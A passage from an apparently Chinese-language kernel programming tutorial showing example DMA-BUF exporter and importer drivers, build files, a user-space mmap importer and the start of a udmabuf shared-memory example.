中创建了一个空白设备节点，仅用作 DMA 占位，其实现比较简单故此处不再给出</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">mdev</span>  =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> <span class="hljs-title">a3exporter_dmabuf_ops</span> =</span> &#123;<br>    .map_dma_buf    = a3exporter_map_dma_buf,<br>    .unmap_dma_buf  = a3exporter_unmap_dma_buf,<br>    .release        = a3exporter_buf_release,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">a3dmabuf</span> =</span> <span class="hljs-literal">NULL</span>;<br>EXPORT_SYMBOL(a3dmabuf);<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3exporter_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    DEFINE_DMA_BUF_EXPORT_INFO(exp_info);<br>    <span class="hljs-type">char</span> *buf;<br>    <span class="hljs-type">int</span> err;<br><br>    err = a3exporter_create_dev();<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Unable to create exporter device, &quot;</span><br>               <span class="hljs-string">&quot;error code: %d\n&quot;</span>, err);<br>        <span class="hljs-keyword">goto</span> err_dev;<br>    &#125;<br><br>    buf = kmalloc(PAGE_SIZE * <span class="hljs-number">8</span>, GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (!buf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Failed to allocate memory for buf!\n&quot;</span>);<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_buf_no_mem;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        *(<span class="hljs-type">uint64_t</span>*) &amp;buf[PAGE_SIZE * i] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba0&quot;</span>;<br>        buf[PAGE_SIZE * i + <span class="hljs-number">7</span>] += i;<br>    &#125;<br><br>    exp_info.ops    = &amp;a3exporter_dmabuf_ops;<br>    exp_info.size   = PAGE_SIZE * <span class="hljs-number">8</span>;<br>    exp_info.priv   = buf;<br>    exp_info.flags  = O_RDWR | O_CLOEXEC;<br><br>    a3dmabuf = dma_buf_export(&amp;exp_info);<br>    <span class="hljs-keyword">if</span> (IS_ERR(a3dmabuf)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Failed to allocate dma_buf!\n&quot;</span>);<br>        err = PTR_ERR(a3dmabuf);<br>        <span class="hljs-keyword">goto</span> err_exp_info;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3exporter:] Module initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_exp_info:<br>    kfree(buf);<br>err_buf_no_mem:<br>err_dev:<br>    class_destroy(mclass);<br>    unregister_chrdev(major_num, DEVICE_NAME);<br>    <span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3exporter_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (a3dmabuf) &#123;<br>        dma_buf_put(a3dmabuf);<br>        a3dmabuf = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    class_destroy(mclass);<br>    unregister_chrdev(major_num, DEVICE_NAME);<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3exporter:] See you next time.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="importer-驱动简单示例"><a href="#importer-驱动简单示例" class="headerlink" title="importer 驱动简单示例"></a>importer 驱动简单示例</h2><p>接下来编写测试用的 importer 驱动，要在内核空间中使用一个 <code>dma_buf</code> ，我们只需要如下步骤：</p><ul><li>获取 <code>dma_buf</code> 并增加引用计数，这里注意 <code>dma_buf</code> 的引用计数是通过文件描述符 <code>dma_buf::fd</code> 进行记录的</li><li>将所选设备节点 <code>struct device</code> 给 attach 到 <code>dma_buf</code> 上</li><li>调用 <code>map_dma_buf()</code> 获取 <code>sg_table</code></li></ul><p>接下来直接访问 <code>sg_table-&gt;scatterlist</code> 即可，需要注意的是这里是一个给外设使用的 DMA 地址，而我们只是在内核中测试使用，因此我们需要再转回内核虚拟地址，下面是一个简易的示例 importer 代码核心部分：</p><blockquote><p>以及需要注意的是 DMA-BUF 依赖于设备节点，因此这里我们使用 <code>a3importer_create_dev()</code> 创造一个占位设备，代码比较简单这里不再展开</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/dma-buf.h&gt;</span></span><br><br>MODULE_IMPORT_NS(DMA_BUF);<br><br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">a3dmabuf</span>;</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">mdev</span>  =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3importer_import_dmabuf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_attachment</span> *<span class="hljs-title">attach</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">dma_data_direction</span> <span class="hljs-title">direction</span> =</span> DMA_BIDIRECTIONAL;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sg_table</span> *<span class="hljs-title">sgt</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scatterlist</span> *<span class="hljs-title">sg</span>;</span><br>    <span class="hljs-type">size_t</span> bufsz;<br>    <span class="hljs-type">char</span> *buf;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (!a3dmabuf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3importer:] No dma_buf got! &quot;</span><br>               <span class="hljs-string">&quot;Exporter not working properly?\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EFAULT;<br>    &#125;<br><br>    attach = dma_buf_attach(a3dmabuf, mdev);<br>    <span class="hljs-keyword">if</span> (IS_ERR(attach)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3importer:] Unable to attach to dma_buf!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> PTR_ERR(attach);<br>    &#125;<br><br>    sgt = dma_buf_map_attachment(attach, direction);<br>    <span class="hljs-keyword">if</span> (IS_ERR(sgt)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3importer:] Unable to map the dma_buf!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> PTR_ERR(sgt);<br>    &#125;<br><br>    for_each_sg(sgt-&gt;sgl, sg, sgt-&gt;nents, i) &#123;<br>        buf = (<span class="hljs-type">char</span>*) sg_dma_address(sg) + page_offset_base;<br>        bufsz = sg_dma_len(sg);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> loc = <span class="hljs-number">0</span>; loc &lt; bufsz; loc += PAGE_SIZE) &#123;<br>            printk(KERN_INFO <span class="hljs-string">&quot;[a3importer:] Got data: %s\n&quot;</span>, buf + loc);<br>        &#125;<br>    &#125;<br><br>    dma_buf_unmap_attachment(attach, sgt, direction);<br><br>    dma_buf_detach(a3dmabuf, attach);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3importer_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    barrier();<br>    <span class="hljs-keyword">return</span> a3importer_create_dev() || a3importer_import_dmabuf();<br>&#125;<br></code></pre></td></tr></table></figure><p>Makefile 编写如下，别忘了替换 kernel 路径：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CURRENT_PATH := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><br>LINUX_KERNEL_SRC := your_path_to_kernel_build,e.g.,/lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build<br>CC=clang<br><br><span class="hljs-section">all:</span><br>make CC=<span class="hljs-variable">$(CC)</span> -C <span class="hljs-variable">$(LINUX_KERNEL_SRC)</span> M=<span class="hljs-variable">$(CURRENT_PATH)</span> modules<br><span class="hljs-section">clean:</span><br>make CC=<span class="hljs-variable">$(CC)</span> -C <span class="hljs-variable">$(LINUX_KERNEL_SRC)</span> M=<span class="hljs-variable">$(CURRENT_PATH)</span> clean<br><br></code></pre></td></tr></table></figure><p>Kbuild 编写如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kbuild">EXPORTER_MODULE_NAME ?= exporter-test<br>IMPORTER_MODULE_NAME ?= importer-test<br><br>obj-m += $(EXPORTER_MODULE_NAME).o<br>obj-m += $(IMPORTER_MODULE_NAME).o<br><br>$(EXPORTER_MODULE_NAME)-y += exporter.o<br>$(IMPORTER_MODULE_NAME)-y += importer.o<br></code></pre></td></tr></table></figure><p>测试，成功完成内核驱动间的数据传递：</p><p><img src="https://s2.loli.net/2024/12/31/rXuWZY1g78wjGFK.png"></p><h2 id="importer-应用程序示例"><a href="#importer-应用程序示例" class="headerlink" title="importer 应用程序示例"></a>importer 应用程序示例</h2><p>接下来我们看一种可能更常见的 DMA-BUF 的使用场景：由内核态 exporter 驱动导出给用户态应用程序，在这种场景下 exporter 需要将 <code>dma_buf</code> 通过 <code>dma_buf_fd()</code> 封装到一个 <strong>新分配的文件描述符</strong>当中传递给用户态，用户态再通过 <code>mmap()</code> 映射该文件描述符以使用这块共享内存</p><p><img src="https://s2.loli.net/2024/12/31/JZ95bEQ67OG1V48.png"></p><p>这里我们直接在设备节点的 <code>ioctl()</code> 当中实现该功能，在上面的驱动代码中增加代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">a3exporter_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> args)</span><br>&#123;<br>    <span class="hljs-type">int</span> buf_fd;<br><br>    <span class="hljs-keyword">if</span> (cmd != <span class="hljs-number">0xdeadbeef</span>) &#123;<br>        <span class="hljs-keyword">return</span> -EINVAL;<br>    &#125;<br><br>    buf_fd = dma_buf_fd(a3dmabuf, O_CLOEXEC);<br>    <span class="hljs-keyword">if</span> (buf_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        printk(<span class="hljs-string">&quot;[a3exporter:] Unable to allocate new file descriptor.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EMFILE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (copy_to_user((<span class="hljs-type">void</span>*) args, &amp;buf_fd, <span class="hljs-keyword">sizeof</span>(buf_fd))) &#123;<br>        printk(<span class="hljs-string">&quot;[a3exporter:] Unable to copy dma_buf fd to userland.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EFAULT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">a3exporter_dev_fops</span> =</span> &#123;<br>    .unlocked_ioctl = a3exporter_ioctl,<br></code></pre></td></tr></table></figure><p>此外，由于用户态通过调用 <code>mmap()</code> 来使用这块内存，因此我们还需要在 exporter 驱动当中实现 <code>dma_buf_ops::mmap()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3exporter_buf_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf *buf, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> remap_pfn_range(<br>        vma,<br>        vma-&gt;vm_start,<br>        page_to_pfn(virt_to_page(buf-&gt;priv)),<br>        buf-&gt;size,<br>        vma-&gt;vm_page_prot<br>    );<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> <span class="hljs-title">a3exporter_dmabuf_ops</span> =</span> &#123;<br>    .mmap           = a3exporter_buf_mmap,<br></code></pre></td></tr></table></figure><p>下面我们实现 importer 应用程序，我们只需要用 <code>ioctl()</code> 获取 <code>dma_buf</code> 的文件描述符并用 <code>mmap()</code> 进行映射即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> dma_fd, dev_fd;<br>    <span class="hljs-type">char</span> *buf;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/a3exporter-dev&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(ioctl(dev_fd, <span class="hljs-number">0xdeadbeef</span>, &amp;dma_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to ioctl dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    buf = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, PROT_READ|PROT_WRITE, MAP_FILE | MAP_SHARED, dma_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!buf) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get data: %s\n&quot;</span>, &amp;buf[<span class="hljs-number">0x1000</span> * i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试，成功完成内核到用户态的数据传递：</p><p><img src="https://s2.loli.net/2024/12/31/MQbFuS1cDP7htm3.png"></p><blockquote><p> 当然，内核的开发实际上是非常灵活的，事实上，我们可以直接实现设备文件接口的 <code>mmap()</code> 并在其中映射 <code>dma_buf</code> ，从而简化代码流程：）</p></blockquote><h1 id="0x03-udmabuf：简易封装接口"><a href="#0x03-udmabuf：简易封装接口" class="headerlink" title="0x03. udmabuf：简易封装接口"></a>0x03. udmabuf：简易封装接口</h1><p>得益于 <code>dma_buf</code> 的好用，Linux kernel <a href="https://patchwork.kernel.org/project/qemu-devel/patch/20180313154826.20436-1-kraxel@redhat.com/">于 2018 年</a>引入了一个封装好的 <code>dma_buf</code> 设备驱动——<code>udmabuf</code> ，其在内核中实现了一个封装好的 exporter，并支持通过 <code>ioctl()</code> 创建 <code>dma_buf</code> 以在用户态程序之间进行内存共享</p><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p><code>udmabuf</code> 的基本使用方式非常简单：</p><ul><li>使用 <code>memfd_create()</code> 创建一个文件描述符</li><li>封装 <code>udmabuf_create</code> 请求，通过 <code>ioctl(&quot;/dev/udmabuf&quot;)</code> 获取 <code>dma_buf</code> 的 fd</li><li>通过 <code>mmap()</code> 进行访问</li></ul><p>有了 <code>dma_buf</code> 的 fd，后面的内存访问操作就和之前没什么区别了，在进程间进行共享只需要共享这个文件描述符即可（例如使用 UNIX domain socket）</p><p>这里给出一个示例程序，文件描述符直接通过 <code>fork()</code> 共享：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/udmabuf.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> dma_fd, dev_fd, mem_fd;<br>    <span class="hljs-type">char</span> *buf1, *buf2;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf_create</span> <span class="hljs-title">info</span>;</span><br><br>    mem_fd = memfd_create(<span class="hljs-string">&quot;test&quot;</span>, MFD_ALLOW_SEALING);<br>    <span class="hljs-keyword">if</span> (mem_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ftruncate(mem_fd, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to change size of mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to seal mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/udmabuf&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open udmabuf dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    info.memfd = mem_fd;<br>    info.size = <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>;<br><br>    dma_fd = ioctl(dev_fd, UDMABUF_CREATE, &amp;info);<br>    <span class="hljs-keyword">if</span> (dma_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create dma_buf&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    buf1 = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, PROT_READ | PROT_WRITE, MAP_FILE | MAP_SHARED, dma_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!buf1) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        *(<span class="hljs-type">size_t</span>*) &amp;buf1[i * <span class="hljs-number">0x1000</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba0&quot;</span>;<br>        buf1[i * <span class="hljs-number">0x1000</span> + <span class="hljs-number">7</span>] += i;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        buf2 = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, 